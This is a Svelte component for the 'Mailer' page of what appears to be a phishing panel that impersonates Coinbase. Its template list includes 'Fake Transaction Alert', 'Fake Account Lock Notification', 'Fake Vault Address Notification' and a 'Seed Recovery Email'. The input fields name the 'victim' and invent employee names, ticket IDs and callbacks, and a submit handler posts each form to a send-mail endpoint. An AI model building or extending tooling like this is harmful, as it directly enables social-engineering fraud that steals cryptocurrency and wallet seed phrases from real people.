<script lang="ts">
	import { onMount } from 'svelte';
	import { fade, fly, scale, slide } from 'svelte/transition';
	import { elasticOut } from 'svelte/easing';
	import placeholderImage from '$lib/previews/placeholder.png';

	export let username: string;
	export let guild: string;

	// change those
	const mailTemplates = {
		vault: {
			name: 'Vault Setup Email',
			icon: 'lock',
			description:
				'A secure email guiding users to set up their Coinbase Vault with step-by-step instructions',
			fields: ['email', 'cb_id', 'link'],
			preview: '/src/lib/previews/mailer/vaultsetup.png',
			category: 'Onboarding'
		},
		emp: {
			name: 'Employee Verification Email',
			icon: 'group',
			description: 'Notify about an employee interaction with victim and ticket information',
			fields: ['email', 'emp_f', 'emp_l', 'vic_f', 'vic_l', 'ticket_id'],
			preview: '/src/lib/previews/emp.png',
			category: 'Notifications'
		},
		device_conf: {
			name: 'Device Access Notification',
			icon: 'devices',
			description: 'Inform users about device access with location details',
			fields: ['email', 'vic_name', 'location'],
			preview: '/src/lib/previews/device.png',
			category: 'Security'
		},
		fake_tx: {
			name: 'Fake Transaction Alert',
			icon: 'money_off',
			description: 'Alert users about a fake transaction attempt with coin and amount details',
			fields: ['email', 'coin', 'amount'],
			preview: '/src/lib/previews/faketx.png',
			category: 'Alerts'
		},
		cbwallet_seed: {
			name: 'Seed Recovery Email',
			icon: 'key',
			description: 'Send recovery seed information securely to the user',
			fields: ['email'],
			preview: '/src/lib/previews/seed.png',
			category: 'Security'
		},
		callback: {
			name: 'Callback Request Email',
			icon: 'call',
			description: 'Send callback details with employee, victim, and case information',
			fields: ['email', 'emp_name', 'vic_name', 'ticket_id', 'callback_date'],
			preview: '/src/lib/previews/callback.png',
			category: 'Notifications'
		},
		wallet: {
			name: 'Wallet Setup Email',
			icon: 'account_balance_wallet',
			description: 'Guide users to set up their Coinbase Wallet with CB ID and URL',
			fields: ['email', 'cb_id', 'link'],
			preview: '/src/lib/previews/wallet.png',
			category: 'Onboarding'
		},
		lock: {
			name: 'Fake Account Lock Notification',
			icon: 'lock',
			description: 'Inform users about an account lock and next steps',
			fields: ['email', 'vic_name'],
			preview: '/src/lib/previews/lock.png',
			category: 'Security'
		},
		fake_vault_addy: {
			name: 'Fake Vault Address Notification',
			icon: 'place',
			description: 'Send details about the fake vault address and related vault ID',
			fields: ['email', 'asset', 'address', 'cb_id'],
			preview: '/src/lib/previews/address.png',
			category: 'Information'
		},
		panel: {
			name: 'Panel Link',
			icon: 'dashboard',
			description: 'Send a mail with a link to the panel',
			fields: ['email', 'cb_id', 'link'],
			preview: '/src/lib/previews/mailer/panel.png',
			category: 'Information'
		},
		ticket: {
			name: 'Support Ticket Email',
			icon: 'confirmation_number',
			description: 'Send support ticket information to the recipient',
			fields: ['email', 'cb_id', 'link'],
			preview: '/src/lib/previews/ticket.png',
			category: 'Support'
		}
	};

	let selectedTemplate = 'vault';
	let formData: { [key: string]: string } = {};
	let showFullscreenPreview = false;
	let isSubmitting = false;
	let formValid = false;
	let showRateLimitModal = false;
	let showSuccessModal = false;
	let successDetails = {
		template: '',
		recipient: ''
	};

	let showOptions = false;
	let searchQuery = '';
	let filteredTemplates = {};

	$: currentTemplate = mailTemplates[selectedTemplate as keyof typeof mailTemplates];

	$: templateCategories = Object.entries(mailTemplates).reduce(
		(acc, [key, template]) => {
			if (!acc[template.category]) {
				acc[template.category] = [];
			}
			acc[template.category].push({ key, ...template });
			return acc;
		},
		{} as { [key: string]: any[] }
	);

	$: {
		if (currentTemplate) {
			formData = {};
			currentTemplate.fields.forEach((field) => {
				formData[field] = '';
			});
			validateForm();
		}
	}

	$: {
		if (showOptions) {
			filteredTemplates = Object.entries(templateCategories).reduce(
				(acc, [category, templates]) => {
					const filtered = templates.filter(
						(template) =>
							template.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
							template.description.toLowerCase().includes(searchQuery.toLowerCase())
					);
					if (filtered.length > 0) {
						acc[category] = filtered;
					}
					return acc;
				},
				{}
			);
		}
	}

	function validateForm() {
		formValid = Object.values(formData).every((value) => value.trim() !== '');
	}

	async function handleSubmit() {
		if (!formValid) return;

		isSubmitting = true;
		try {
			const response = await fetch(`/api/mailer/sendmail/${selectedTemplate}`, {
				method: 'POST',
				headers: {
					'Content-Type': 'application/json'
				},
				body: JSON.stringify({
					...formData,
					username
				}),
				credentials: 'include'
			});

			if (response.status === 429) {
				showRateLimitModal = true;
				return;
			}

			if (!response.ok) {
				const errorData = await response.json();
				throw new Error(errorData.error || 'Failed to send email');
			}

			const result = await response.json();
			console.log('Mail sent successfully:', result);
			successDetails = {
				template: currentTemplate.name,
				recipient: formData.email
			};
			showSuccessModal = true;
		} catch (error) {
			console.error('Error sending mail:', error);
		} finally {
			isSubmitting = false;
		}
	}

	function getFieldLabel(field: string): string {
		return field
			.split(/(?=[A-Z])|_/)
			.map((word) => word.charAt(0).toUpperCase() + word.slice(1).toLowerCase())
			.join(' ');
	}

	// Add this function to handle clicks outside the dropdown
	function handleClickOutside(event: MouseEvent) {
		const target = event.target as HTMLElement;
		const dropdown = document.querySelector('.custom-select');
		if (dropdown && !dropdown.contains(target)) {
			showOptions = false;
		}
	}

	onMount(() => {
		document.addEventListener('click', handleClickOutside);
		return () => {
			document.removeEventListener('click', handleClickOutside);
		};
	});
</script>

<div class="mailer" in:fade>
	<div class="intro">
		<div class="intro-content">
			<p>Your centralized mailer panel</p>
			<h1 class="white">Mailer</h1>
		</div>
		<div class="intro-stats">
			<div class="stat">
				<span class="material-icons">mail</span>
				<div class="stat-content">
					<p>Available Templates</p>
					<h3>{Object.keys(mailTemplates).length}</h3>
				</div>
			</div>
			<div class="stat">
				<span class="material-icons">category</span>
				<div class="stat-content">
					<p>Categories</p>
					<h3>{Object.keys(templateCategories).length}</h3>
				</div>
			</div>
		</div>
	</div>

	<div class="content-grid">
		<div class="left-panel">
			<div class="template-selection">
				<label class="section-label">
					<span class="material-icons">mail</span>
					Select Mail Template
				</label>
				<div class="custom-select">
					<div
						class="selected-option"
						on:click|stopPropagation={() => (showOptions = !showOptions)}
					>
						<span class="material-icons">{currentTemplate.icon}</span>
						<span class="option-text">{currentTemplate.name}</span>
						<span class="material-icons dropdown-arrow" class:open={showOptions}>expand_more</span>
					</div>

					{#if showOptions}
						<div class="options-container" transition:slide|local>
							<div class="search-container">
								<span class="material-icons search-icon">search</span>
								<input
									type="text"
									class="search-input"
									placeholder="Search templates..."
									bind:value={searchQuery}
									on:click|stopPropagation
								/>
							</div>
							{#each Object.entries(filteredTemplates) as [category, templates]}
								<div class="option-group">
									<div class="group-header">
										<span class="material-icons">folder</span>
										{category}
									</div>
									{#each templates as template}
										<div
											class="option"
											class:selected={selectedTemplate === template.key}
											on:click={() => {
												selectedTemplate = template.key;
												showOptions = false;
												searchQuery = '';
											}}
										>
											<span class="material-icons">{template.icon}</span>
											<div class="option-content">
												<span class="option-text">{template.name}</span>
												<span class="option-description">{template.description}</span>
											</div>
											{#if selectedTemplate === template.key}
												<span class="material-icons check">check</span>
											{/if}
										</div>
									{/each}
								</div>
							{/each}
							{#if Object.keys(filteredTemplates).length === 0}
								<div class="no-results">
									<span class="material-icons">search_off</span>
									<p>No matching templates found</p>
								</div>
							{/if}
						</div>
					{/if}
				</div>
			</div>

			<div class="info-panel">
				<div class="info-section template-info">
					<div class="info-header">
						<span class="material-icons">{currentTemplate.icon}</span>
						<h3>{currentTemplate.name}</h3>
					</div>
					<div class="template-meta">
						<span class="category-badge">
							<span class="material-icons">folder</span>
							{currentTemplate.category}
						</span>
					</div>
					<p class="description">{currentTemplate.description}</p>
				</div>

				<div class="info-section">
					<div class="info-header">
						<span class="material-icons">edit_note</span>
						<h3>Template Fields</h3>
					</div>
					<div class="fields-container">
						{#each currentTemplate.fields as field}
							<div class="field-group" in:fly={{ y: 10, duration: 400 }}>
								<label for={field}>{getFieldLabel(field)}</label>
								<div class="input-wrapper">
									<input
										type="text"
										id={field}
										bind:value={formData[field]}
										on:input={validateForm}
										placeholder="Enter {field.toLowerCase()}"
										class:filled={formData[field]?.trim()}
									/>
									{#if formData[field]?.trim()}
										<span class="material-icons check-icon" in:scale={{ duration: 200 }}>
											check_circle
										</span>
									{/if}
								</div>
							</div>
						{/each}
					</div>
				</div>
			</div>

			<button class="submit-button" on:click={handleSubmit} disabled={!formValid || isSubmitting}>
				<span class="material-icons">{isSubmitting ? 'sync' : 'send'}</span>
				{isSubmitting ? 'Sending...' : 'Send Email'}
			</button>
		</div>

		<div class="preview-panel">
			<div class="preview-header">
				<span class="material-icons">preview</span>
				<h3>Template Preview</h3>
				<button class="zoom-hint" on:click={() => (showFullscreenPreview = true)}>
					<span class="material-icons">zoom_in</span>
					Click to zoom
				</button>
			</div>
			<div class="preview-container">
				<div class="preview-frame">
					<img
						src={currentTemplate.preview}
						alt="Email Template Preview"
						on:error={(e) => ((e.currentTarget as HTMLImageElement).src = placeholderImage)}
						on:click={() => (showFullscreenPreview = true)}
						class="preview-image"
					/>
					<div class="preview-overlay">
						<span class="material-icons">zoom_in</span>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>

{#if showFullscreenPreview}
	<div
		class="fullscreen-preview"
		transition:fade={{ duration: 200 }}
		on:click|self={() => (showFullscreenPreview = false)}
	>
		<div class="fullscreen-container" in:scale={{ duration: 300, easing: elasticOut }}>
			<button class="close-fullscreen" on:click={() => (showFullscreenPreview = false)}>
				<span class="material-icons">close</span>
			</button>
			<img
				src={currentTemplate.preview}
				alt="Full Preview"
				on:error={(e) => ((e.currentTarget as HTMLImageElement).src = placeholderImage)}
			/>
		</div>
	</div>
{/if}

{#if showRateLimitModal}
	<div
		class="modal-overlay"
		transition:fade={{ duration: 200 }}
		on:click|self={() => (showRateLimitModal = false)}
	>
		<div class="rate-limit-modal" in:scale={{ duration: 300, easing: elasticOut }}>
			<div class="modal-icon">
				<span class="material-icons">timer</span>
			</div>
			<h2>Slow Down!</h2>
			<p>You're sending emails too quickly. Please wait a moment before trying again.</p>
			<button class="modal-button" on:click={() => (showRateLimitModal = false)}> Got it </button>
		</div>
	</div>
{/if}

{#if showSuccessModal}
	<div
		class="modal-overlay success-overlay"
		transition:fade={{ duration: 200 }}
		on:click|self={() => (showSuccessModal = false)}
	>
		<div class="success-modal" in:scale={{ duration: 300, easing: elasticOut }}>
			<div class="success-animation">
				<div class="checkmark-circle">
					<div class="checkmark draw"></div>
				</div>
				<div class="success-ripple"></div>
			</div>
			<h2>Mail Sent Successfully!</h2>
			<div class="success-details">
				<div class="detail-item">
					<span class="material-icons">mail</span>
					<div class="detail-content">
						<label>Template</label>
						<p>{successDetails.template}</p>
					</div>
				</div>
				<div class="detail-item">
					<span class="material-icons">person</span>
					<div class="detail-content">
						<label>Recipient</label>
						<p>{successDetails.recipient}</p>
					</div>
				</div>
				<div class="detail-item">
					<span class="material-icons">schedule</span>
					<div class="detail-content">
						<label>Sent At</label>
						<p>{new Date().toLocaleTimeString()}</p>
					</div>
				</div>
			</div>
			<button class="success-button" on:click={() => (showSuccessModal = false)}>
				<span class="material-icons">check_circle</span>
				Continue
			</button>
		</div>
	</div>
{/if}

<style>
	.mailer {
		padding: 2em;
	}

	.intro {
		padding-bottom: 1.5em;
		border-bottom: 1px solid rgba(98, 71, 218, 0.2);
		margin-bottom: 2em;
		display: flex;
		justify-content: space-between;
		align-items: flex-end;
	}

	.intro-stats {
		display: flex;
		gap: 2em;
	}

	.stat {
		display: flex;
		align-items: center;
		gap: 1em;
		padding: 1em 1.5em;
		background: rgba(56, 35, 155, 0.1);
		border: 1px solid rgba(98, 71, 218, 0.2);
		border-radius: 0.8em;
		transition: all 0.3s ease;
	}

	.stat:hover {
		transform: translateY(-2px);
		border-color: rgba(98, 71, 218, 0.4);
		box-shadow: 0 4px 20px rgba(98, 71, 218, 0.2);
	}

	.stat .material-icons {
		color: rgba(98, 71, 218, 1);
		font-size: 1.5em;
	}

	.stat-content p {
		margin: 0;
		font-size: 0.8em;
		color: #8b8b8b;
	}

	.stat-content h3 {
		margin: 0;
		font-size: 1.2em;
		color: white;
	}

	.content-grid {
		display: grid;
		grid-template-columns: 1fr 400px;
		gap: 2em;
	}

	.left-panel {
		display: flex;
		flex-direction: column;
		gap: 1.5em;
	}

	.section-label {
		display: flex;
		align-items: center;
		gap: 0.5em;
		color: #8b8b8b;
		margin-bottom: 0.8em;
	}

	.styled-select {
		width: 100%;
		padding: 1em;
		background: rgba(56, 35, 155, 0.1);
		border: 1px solid rgba(98, 71, 218, 0.3);
		border-radius: 0.8em;
		color: white;
		font-family: 'DM Sans', sans-serif;
		cursor: pointer;
		transition: all 0.3s ease;
	}

	.styled-select:hover {
		border-color: rgba(98, 71, 218, 0.6);
		box-shadow: 0 0 15px rgba(98, 71, 218, 0.2);
	}

	.styled-select optgroup {
		background: #0e0d15;
		color: #8b8b8b;
		font-weight: 500;
		padding: 0.5em;
	}

	.styled-select option {
		background: #16171a;
		color: white;
		padding: 0.8em;
	}

	.info-panel {
		display: flex;
		flex-direction: column;
		gap: 1.5em;
	}

	.info-section {
		background: rgba(56, 35, 155, 0.1);
		border: 1px solid rgba(98, 71, 218, 0.2);
		border-radius: 0.8em;
		padding: 1.2em;
		transition: all 0.3s ease;
	}

	.template-info {
		background: linear-gradient(45deg, rgba(56, 35, 155, 0.2) 0%, rgba(14, 13, 21, 0.95) 100%);
	}

	.info-section:hover {
		transform: translateY(-2px);
		border-color: rgba(98, 71, 218, 0.4);
		box-shadow: 0 4px 20px rgba(98, 71, 218, 0.2);
	}

	.template-meta {
		margin: 1em 0;
	}

	.category-badge {
		display: inline-flex;
		align-items: center;
		gap: 0.4em;
		padding: 0.4em 0.8em;
		background: rgba(98, 71, 218, 0.1);
		border: 1px solid rgba(98, 71, 218, 0.3);
		border-radius: 2em;
		font-size: 0.8em;
		color: rgba(98, 71, 218, 1);
	}

	.category-badge .material-icons {
		font-size: 1em;
	}

	.info-header {
		display: flex;
		align-items: center;
		gap: 0.5em;
		margin-bottom: 0.8em;
		color: rgba(98, 71, 218, 1);
	}

	.info-header h3 {
		margin: 0;
		font-size: 1em;
		font-weight: 500;
	}

	.description {
		color: #8b8b8b;
		font-size: 0.9em;
		line-height: 1.6;
		margin: 0;
	}

	.fields-container {
		display: flex;
		flex-direction: column;
		gap: 1em;
	}

	.field-group {
		display: flex;
		flex-direction: column;
		gap: 0.5em;
	}

	.field-group label {
		color: #8b8b8b;
		font-size: 0.9em;
		display: flex;
		align-items: center;
		gap: 0.5em;
	}

	.input-wrapper {
		position: relative;
		display: flex;
		align-items: center;
	}

	.field-group input {
		width: 100%;
		padding: 0.8em;
		padding-right: 2.5em;
		background: rgba(14, 13, 21, 0.6);
		border: 1px solid rgba(98, 71, 218, 0.2);
		border-radius: 0.5em;
		color: white;
		font-family: 'DM Sans', sans-serif;
		transition: all 0.3s ease;
	}

	.field-group input:focus {
		outline: none;
		border-color: rgba(98, 71, 218, 0.6);
		box-shadow: 0 0 15px rgba(98, 71, 218, 0.2);
	}

	.field-group input.filled {
		border-color: rgba(98, 71, 218, 0.4);
	}

	.check-icon {
		position: absolute;
		right: 0.8em;
		color: #4caf50;
		font-size: 1.2em;
	}

	.preview-panel {
		background: rgba(14, 13, 21, 0.8);
		border: 1px solid rgba(98, 71, 218, 0.3);
		border-radius: 1em;
		padding: 1.5em;
		display: flex;
		flex-direction: column;
		gap: 1em;
		box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
	}

	.preview-header {
		display: flex;
		align-items: center;
		gap: 0.8em;
		padding-bottom: 1em;
		border-bottom: 1px solid rgba(98, 71, 218, 0.2);
	}

	.preview-header h3 {
		margin: 0;
		font-size: 1.1em;
		font-weight: 500;
		background: linear-gradient(45deg, #fff, rgba(98, 71, 218, 1));
		-webkit-background-clip: text;
		-webkit-text-fill-color: transparent;
		flex-grow: 1;
	}

	.zoom-hint {
		display: flex;
		align-items: center;
		gap: 0.4em;
		padding: 0.4em 0.8em;
		background: none;
		border: 1px solid rgba(98, 71, 218, 0.3);
		border-radius: 2em;
		color: #8b8b8b;
		font-size: 0.8em;
		cursor: pointer;
		transition: all 0.3s ease;
	}

	.zoom-hint:hover {
		color: white;
		border-color: rgba(98, 71, 218, 0.6);
		background: rgba(98, 71, 218, 0.1);
	}

	.zoom-hint .material-icons {
		font-size: 1.2em;
	}

	.preview-container {
		position: relative;
		width: 100%;
		padding-top: 120%;
		background: rgba(14, 13, 21, 0.9);
		border: 1px solid rgba(98, 71, 218, 0.2);
		border-radius: 0.8em;
		overflow: hidden;
	}

	.preview-frame {
		position: absolute;
		top: 0;
		left: 0;
		right: 0;
		bottom: 0;
		display: flex;
		align-items: center;
		justify-content: center;
		padding: 1em;
	}

	.preview-frame img {
		width: 100%;
		height: 100%;
		object-fit: contain;
		border-radius: 0.5em;
		box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
		transition: all 0.3s ease;
		cursor: zoom-in;
	}

	.preview-overlay {
		position: absolute;
		top: 0;
		left: 0;
		right: 0;
		bottom: 0;
		background: rgba(14, 13, 21, 0.4);
		display: flex;
		align-items: center;
		justify-content: center;
		opacity: 0;
		transition: all 0.3s ease;
	}

	.preview-overlay .material-icons {
		font-size: 2em;
		color: white;
	}

	.preview-frame:hover .preview-overlay {
		opacity: 1;
	}

	.preview-frame:hover img {
		transform: scale(1.02);
		box-shadow: 0 12px 40px rgba(98, 71, 218, 0.3);
	}

	.submit-button {
		width: 100%;
		padding: 1em;
		display: flex;
		align-items: center;
		justify-content: center;
		gap: 0.5em;
		background: linear-gradient(45deg, rgba(98, 71, 218, 0.8) 0%, rgba(56, 35, 155, 0.8) 100%);
		border: none;
		border-radius: 0.8em;
		color: white;
		font-weight: 500;
		cursor: pointer;
		transition: all 0.3s ease;
	}

	.submit-button:not(:disabled):hover {
		transform: translateY(-2px);
		box-shadow: 0 4px 20px rgba(98, 71, 218, 0.4);
		background: linear-gradient(45deg, rgba(98, 71, 218, 0.9) 0%, rgba(56, 35, 155, 0.9) 100%);
	}

	.submit-button:disabled {
		opacity: 0.6;
		cursor: not-allowed;
	}

	.submit-button .material-icons {
		font-size: 1.2em;
	}

	@keyframes spin {
		from {
			transform: rotate(0deg);
		}
		to {
			transform: rotate(360deg);
		}
	}

	.submit-button:disabled .material-icons {
		animation: spin 1s linear infinite;
	}

	.fullscreen-preview {
		position: fixed;
		top: 0;
		left: 0;
		width: 100%;
		height: 100%;
		background: rgba(14, 13, 21, 0.95);
		backdrop-filter: blur(10px);
		z-index: 1100;
		display: flex;
		align-items: center;
		justify-content: center;
		padding: 2em;
		cursor: zoom-out;
	}

	.fullscreen-container {
		position: relative;
		max-width: 90%;
		max-height: 90vh;
	}

	.close-fullscreen {
		position: absolute;
		top: -3em;
		right: 0;
		background: none;
		border: none;
		color: white;
		cursor: pointer;
		padding: 0.5em;
		z-index: 1101;
		transition: all 0.3s ease;
		border-radius: 50%;
		display: flex;
		align-items: center;
		justify-content: center;
	}

	.close-fullscreen:hover {
		background: rgba(98, 71, 218, 0.2);
		transform: rotate(90deg);
	}

	.fullscreen-container img {
		max-width: 100%;
		max-height: 85vh;
		object-fit: contain;
		border-radius: 0.8em;
		box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
	}

	.modal-overlay {
		position: fixed;
		top: 0;
		left: 0;
		width: 100%;
		height: 100%;
		background: rgba(14, 13, 21, 0.95);
		backdrop-filter: blur(8px);
		z-index: 1200;
		display: flex;
		align-items: center;
		justify-content: center;
		padding: 2em;
	}

	.rate-limit-modal {
		background: linear-gradient(45deg, rgba(56, 35, 155, 0.95) 0%, rgba(14, 13, 21, 0.95) 100%);
		border: 1px solid rgba(98, 71, 218, 0.4);
		border-radius: 1.2em;
		padding: 2.5em;
		max-width: 400px;
		text-align: center;
		box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
	}

	.modal-icon {
		width: 80px;
		height: 80px;
		background: rgba(98, 71, 218, 0.1);
		border: 2px solid rgba(98, 71, 218, 0.4);
		border-radius: 50%;
		display: flex;
		align-items: center;
		justify-content: center;
		margin: 0 auto 1.5em;
	}

	.modal-icon .material-icons {
		font-size: 2.5em;
		color: rgba(98, 71, 218, 1);
		animation: pulse 2s infinite;
	}

	@keyframes pulse {
		0% {
			transform: scale(1);
		}
		50% {
			transform: scale(1.1);
		}
		100% {
			transform: scale(1);
		}
	}

	.rate-limit-modal h2 {
		margin: 0 0 0.5em;
		font-size: 1.8em;
		background: linear-gradient(45deg, #fff, rgba(98, 71, 218, 1));
		-webkit-background-clip: text;
		-webkit-text-fill-color: transparent;
	}

	.rate-limit-modal p {
		color: #8b8b8b;
		line-height: 1.6;
		margin: 0 0 1.5em;
	}

	.modal-button {
		padding: 0.8em 2em;
		background: linear-gradient(45deg, rgba(98, 71, 218, 0.8) 0%, rgba(56, 35, 155, 0.8) 100%);
		border: none;
		border-radius: 2em;
		color: white;
		font-weight: 500;
		cursor: pointer;
		transition: all 0.3s ease;
	}

	.modal-button:hover {
		transform: translateY(-2px);
		box-shadow: 0 4px 20px rgba(98, 71, 218, 0.4);
		background: linear-gradient(45deg, rgba(98, 71, 218, 0.9) 0%, rgba(56, 35, 155, 0.9) 100%);
	}

	.success-overlay {
		background: rgba(14, 13, 21, 0.98);
	}

	.success-modal {
		background: linear-gradient(165deg, rgba(56, 35, 155, 0.95) 0%, rgba(14, 13, 21, 0.98) 100%);
		border: 1px solid rgba(98, 71, 218, 0.4);
		border-radius: 1.2em;
		padding: 3em 2.5em 2.5em;
		max-width: 450px;
		width: 90%;
		text-align: center;
		box-shadow:
			0 8px 32px rgba(0, 0, 0, 0.4),
			0 0 0 1px rgba(98, 71, 218, 0.2),
			0 0 100px rgba(98, 71, 218, 0.1);
		position: relative;
		overflow: hidden;
	}

	.success-animation {
		position: relative;
		width: 100px;
		height: 100px;
		margin: 0 auto 2em;
	}

	.checkmark-circle {
		width: 100px;
		height: 100px;
		position: relative;
		background: rgba(98, 71, 218, 0.1);
		border: 2px solid rgba(98, 71, 218, 0.6);
		border-radius: 50%;
		animation: scale-in 0.3s ease-out;
	}

	.checkmark {
		width: 50px;
		height: 25px;
		position: absolute;
		top: 50%;
		left: 50%;
		margin: -2px 0 0 -25px;
		border-right: 4px solid #4caf50;
		border-bottom: 4px solid #4caf50;
		transform: rotate(45deg) scale(0);
		animation: checkmark 0.4s ease-in-out 0.2s forwards;
	}

	.success-ripple {
		position: absolute;
		top: 0;
		left: 0;
		width: 100%;
		height: 100%;
		border: 4px solid rgba(98, 71, 218, 0.4);
		border-radius: 50%;
		animation: ripple 1s ease-out infinite;
	}

	@keyframes scale-in {
		from {
			transform: scale(0);
			opacity: 0;
		}
		to {
			transform: scale(1);
			opacity: 1;
		}
	}

	@keyframes checkmark {
		0% {
			transform: rotate(45deg) scale(0);
			opacity: 0;
		}
		100% {
			transform: rotate(45deg) scale(1);
			opacity: 1;
		}
	}

	@keyframes ripple {
		0% {
			transform: scale(1);
			opacity: 1;
		}
		100% {
			transform: scale(1.5);
			opacity: 0;
		}
	}

	.success-modal h2 {
		margin: 0 0 1.5em;
		font-size: 1.8em;
		background: linear-gradient(45deg, #fff, rgba(98, 71, 218, 1));
		-webkit-background-clip: text;
		-webkit-text-fill-color: transparent;
		position: relative;
	}

	.success-details {
		display: flex;
		flex-direction: column;
		gap: 1em;
		margin-bottom: 2em;
		position: relative;
	}

	.success-details::before {
		content: '';
		position: absolute;
		top: -1em;
		left: -1em;
		right: -1em;
		bottom: -1em;
		background: linear-gradient(45deg, rgba(98, 71, 218, 0.1), transparent);
		border-radius: 1em;
		z-index: -1;
	}

	.detail-item {
		display: flex;
		align-items: center;
		gap: 1em;
		padding: 1em;
		background: rgba(14, 13, 21, 0.4);
		border: 1px solid rgba(98, 71, 218, 0.2);
		border-radius: 0.8em;
		text-align: left;
		transition: all 0.3s ease;
	}

	.detail-item:hover {
		transform: translateX(0.5em);
		background: rgba(14, 13, 21, 0.6);
		border-color: rgba(98, 71, 218, 0.4);
	}

	.detail-item .material-icons {
		color: rgba(98, 71, 218, 1);
		font-size: 1.4em;
	}

	.detail-content {
		flex: 1;
	}

	.detail-content label {
		display: block;
		font-size: 0.8em;
		color: #8b8b8b;
		margin-bottom: 0.2em;
	}

	.detail-content p {
		margin: 0;
		color: white;
		font-size: 1em;
	}

	.success-button {
		display: inline-flex;
		align-items: center;
		gap: 0.5em;
		padding: 0.8em 2em;
		background: linear-gradient(45deg, rgba(98, 71, 218, 0.8) 0%, rgba(56, 35, 155, 0.8) 100%);
		border: none;
		border-radius: 2em;
		color: white;
		font-weight: 500;
		cursor: pointer;
		transition: all 0.3s ease;
		position: relative;
		overflow: hidden;
	}

	.success-button::before {
		content: '';
		position: absolute;
		top: 0;
		left: 0;
		width: 100%;
		height: 100%;
		background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.1), transparent);
		transform: translateX(-100%);
		transition: transform 0.5s ease;
	}

	.success-button:hover {
		transform: translateY(-2px);
		box-shadow: 0 4px 20px rgba(98, 71, 218, 0.4);
		background: linear-gradient(45deg, rgba(98, 71, 218, 0.9) 0%, rgba(56, 35, 155, 0.9) 100%);
	}

	.success-button:hover::before {
		transform: translateX(100%);
	}

	.success-button .material-icons {
		font-size: 1.2em;
		color: #4caf50;
	}

	.custom-select {
		position: relative;
		width: 100%;
	}

	.selected-option {
		display: flex;
		align-items: center;
		gap: 0.8em;
		padding: 1em;
		background: rgba(56, 35, 155, 0.1);
		border: 1px solid rgba(98, 71, 218, 0.3);
		border-radius: 0.8em;
		cursor: pointer;
		transition: all 0.3s ease;
	}

	.selected-option:hover {
		border-color: rgba(98, 71, 218, 0.6);
		background: rgba(56, 35, 155, 0.2);
	}

	.dropdown-arrow {
		margin-left: auto;
		transition: transform 0.3s ease;
	}

	.dropdown-arrow.open {
		transform: rotate(180deg);
	}

	.options-container {
		position: absolute;
		top: calc(100% + 0.5em);
		left: 0;
		right: 0;
		max-height: 400px;
		overflow-y: auto;
		background: rgba(14, 13, 21, 0.95);
		border: 1px solid rgba(98, 71, 218, 0.3);
		border-radius: 0.8em;
		box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
		z-index: 100;
	}

	.search-container {
		padding: 1em;
		border-bottom: 1px solid rgba(98, 71, 218, 0.2);
		position: sticky;
		top: 0;
		background: rgba(14, 13, 21, 0.95);
		backdrop-filter: blur(8px);
		z-index: 1;
		display: flex;
		align-items: center;
		gap: 0.8em;
	}

	.search-icon {
		color: rgba(98, 71, 218, 0.6);
	}

	.search-input {
		flex: 1;
		background: none;
		border: none;
		color: white;
		font-family: 'DM Sans', sans-serif;
		font-size: 0.95em;
		outline: none;
	}

	.search-input::placeholder {
		color: rgba(255, 255, 255, 0.4);
	}

	.option-group {
		padding: 0.5em;
	}

	.group-header {
		padding: 0.8em 1em;
		color: rgba(98, 71, 218, 1);
		font-size: 0.9em;
		font-weight: 500;
		text-transform: uppercase;
		letter-spacing: 0.05em;
		display: flex;
		align-items: center;
		gap: 0.5em;
	}

	.option {
		display: flex;
		align-items: center;
		gap: 0.8em;
		padding: 1em;
		cursor: pointer;
		border-radius: 0.5em;
		transition: all 0.2s ease;
	}

	.option:hover {
		background: rgba(98, 71, 218, 0.1);
	}

	.option.selected {
		background: rgba(98, 71, 218, 0.2);
	}

	.option-content {
		flex: 1;
		display: flex;
		flex-direction: column;
		gap: 0.2em;
	}

	.option-text {
		color: white;
		font-size: 0.95em;
	}

	.option-description {
		color: #8b8b8b;
		font-size: 0.8em;
		line-height: 1.4;
	}

	.check {
		color: rgba(98, 71, 218, 1);
	}

	.no-results {
		padding: 2em;
		text-align: center;
		color: #8b8b8b;
		display: flex;
		flex-direction: column;
		align-items: center;
		gap: 0.8em;
	}

	.no-results .material-icons {
		font-size: 2em;
		color: rgba(98, 71, 218, 0.4);
	}

	.no-results p {
		margin: 0;
		font-size: 0.95em;
	}
</style>
